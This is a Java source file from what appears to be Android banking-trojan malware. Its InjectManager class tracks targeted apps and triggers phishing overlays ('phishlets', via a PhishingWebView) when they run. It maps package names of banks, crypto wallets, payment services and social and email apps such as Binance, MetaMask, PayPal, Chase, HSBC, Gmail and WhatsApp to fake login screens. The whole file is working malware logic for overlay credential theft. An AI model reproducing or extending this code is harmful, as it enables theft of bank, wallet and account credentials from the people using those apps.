package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.ui.PhishingWebView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashSet;
import java.util.Set;

public class InjectManager {
    private static final String TAG = Constants.TAG + ":Inject";
    private static InjectManager instance;
    private final Context ctx;
    private final Set<String> activeInjections;

    private InjectManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.activeInjections = new HashSet<>();
    }

    public static synchronized InjectManager get(Context ctx) {
        if (instance == null) {
            instance = new InjectManager(ctx);
        }
        return instance;
    }

    public void enableInjection(String packageName) {
        activeInjections.add(packageName);
        Log.i(TAG, "Injection enabled for: " + packageName);
    }

    public void disableInjection(String packageName) {
        activeInjections.remove(packageName);
    }

    public boolean isInjected(String packageName) {
        return activeInjections.contains(packageName);
    }

    public void triggerInjection(String packageName) {
        if (!activeInjections.contains(packageName)) return;
        String phishletId = mapPackageToPhishlet(packageName);
        if (phishletId != null) {
            PhishletManager.get(ctx).showPhishlet(phishletId, packageName);
        }
    }

    private String mapPackageToPhishlet(String pkg) {
        if (pkg.contains("binance")) return "binance";
        if (pkg.contains("coinbase")) return "coinbase";
        if (pkg.contains("metamask")) return "metamask";
        if (pkg.contains("trust")) return "trustwallet";
        if (pkg.contains("paypal")) return "paypal";
        if (pkg.contains("chase")) return "chase";
        if (pkg.contains("revolut")) return "revolut";
        if (pkg.contains("hsbc")) return "hsbc";
        if (pkg.contains("facebook")) return "facebook";
        if (pkg.contains("instagram")) return "instagram";
        if (pkg.contains("whatsapp")) return "whatsapp";
        if (pkg.contains("gmail")) return "gmail";
        if (pkg.contains("google")) return "google";
        if (pkg.contains("alipay")) return "alipay";
        if (pkg.contains("wechat")) return "wechat";
        if (pkg.contains("tiktok")) return "tiktok";
        return "generic_login";
    }

    public Set<String> getActiveInjections() {
        return new HashSet<>(activeInjections);
    }
}
